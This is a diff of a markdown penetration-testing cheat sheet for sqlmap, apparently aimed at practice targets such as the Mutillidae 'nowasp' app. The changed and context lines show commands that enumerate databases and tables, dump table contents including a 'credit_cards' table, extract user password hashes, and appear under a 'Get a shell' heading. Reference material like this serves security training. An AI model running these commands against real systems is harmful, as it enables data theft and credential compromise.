@@ -57,13 +57,14 @@ Crawl a page to find sql-injections. Always use a valid non-error generating URL
     sqlmap -u "http://site.org/index.php?vuln_param=1" --dbms=mysql --dbs    #after identifying a vulnerability see database names     
     sqlmap -u "http://site.org/index.php?vuln_param=1" --dbms=mysql -D database --tables    #get table names from a database       
     sqlmap -u "http://site.org/index.php?vuln_param=1" --dbms=mysql -D database -T table --dump    #dump table content         
-Used captured HTTP request (use Burp proxy)   
+Used captured HTTP request (use Burp to capture the request then copy it to a text file)   
 
     sqlmap -r sqli.txt   
-Custom SQLi
+Custom SQLi        
+
     sqlmap -u --data="query" -D [database name] --tables --threads 5 
     
-Dump database 
+Dump database    
 
     sqlmap -u "http://172.21.0.0" --dbms=mysql --dump   
 Get a shell 
@@ -75,7 +76,8 @@ Using sqlmap with login-page
     sqlmap -r request.txt --dbs    
     sqlmap -r request.txt -D dbname -T tablename   
     sqlmap -r request.txt --search -D db_name_search   
-    sqlmap -r request.txt -D nowasp -T credit_cards --dump --start=1 --start=2       #look at 1st 2 records in table    
+    sqlmap -r request.txt -D nowasp -T credit_cards --dump --start=1 --start=2       #look at 1st 2 records in table Search for usernames and passwords    
+    
     sqlmap -r request.txt --users --passwords           #find hashes / usernames     
 
 ### Manual Testing    
